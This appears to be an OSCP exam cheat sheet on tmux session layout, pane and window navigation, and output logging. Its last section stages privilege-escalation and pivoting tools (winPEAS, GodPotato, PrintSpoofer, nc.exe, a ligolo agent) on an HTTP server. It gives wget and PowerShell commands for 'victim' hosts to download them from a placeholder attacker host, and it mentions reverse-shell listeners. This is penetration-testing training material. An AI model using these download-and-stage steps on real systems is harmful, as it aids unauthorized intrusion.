⌨️ TMUX Exam Setup

Do this before touching a single target. One named window per machine. Never lose output.

Session + Window Layout

Start this immediately when the exam VPN connects. Do NOT touch any target until all windows are named and scans are queued.
create session + recommended window layout
tmux new-session -s oscp

# Rename current window:  Ctrl+b ,  → type name → Enter
# New window:             Ctrl+b c
# Rename it:              Ctrl+b ,

# Recommended layout:
# 0: notes      IPs, creds found, running status per target
# 1: scans      all background nmap jobs (&)
# 2: http       python3 -m http.server 8080 (NEVER close this)
# 3: listeners  all nc/pwncat reverse shell listeners
# 4: dc01       AD machine 1
# 5: dc02       AD machine 2
# 6: dc03       AD DC (main Domain Controller)
# 7: web01      standalone 1
# 8: lin01      standalone 2
# 9: win01      standalone 3

Pane Splits

split panes inside each machine window
# Vertical split (left | right):
Ctrl+b %

# Horizontal split (top / bottom):
Ctrl+b "

# Move between panes:
Ctrl+b arrow-key

# Zoom pane fullscreen (toggle):
Ctrl+b z

# Recommended per machine window:
# LEFT pane  → active shell / exploitation
# RIGHT pane → enumeration output / notes

Navigation

window and session commands
Ctrl+b 0-9       # jump directly to window number
Ctrl+b n         # next window
Ctrl+b p         # previous window
Ctrl+b w         # visual window picker
Ctrl+b d         # detach session
tmux attach -t oscp   # reattach

Scroll Mode & Logging

scroll through output
Ctrl+b [         # enter scroll/copy mode
q                # exit scroll mode
/                # search (n = next match)
PgUp / PgDn      # scroll pages
log all output to file (run once per window)
# In the window you want to log:
Ctrl+b :
pipe-pane -o "cat >> ~/exam/logs/tmux_$(tmux display-message -p '#W').log"

# Toggle off:
Ctrl+b :
pipe-pane

Pre-Exam Tool Prep

Stage all tools in ~/exam/serve/ before exam day. The http server serves them to victims instantly.
stage tools + start http server (window 2: http)
mkdir -p ~/exam/serve && cd ~/exam/serve

# Copy tools here before exam (adjust paths to your Kali):
cp /usr/share/peass/linpeas.sh .
cp /usr/share/peass/winPEAS/winPEASx64.exe .
cp /opt/pspy/pspy64 .
cp /opt/ligolo-ng/agent .
cp /opt/ligolo-ng/agent.exe .
cp /opt/GodPotato/GodPotato-NET4.exe .
cp /opt/PrintSpoofer/PrintSpoofer64.exe .
cp /usr/share/windows-resources/binaries/nc.exe .

# Start server — never close this window:
python3 -m http.server 8080

# Victim Linux downloads:   wget http://<KALI>:8080/linpeas.sh
# Victim Windows downloads:  (New-Object Net.WebClient).DownloadFile('http://<KALI>:8080/wp.exe','C:\Temp\wp.exe')
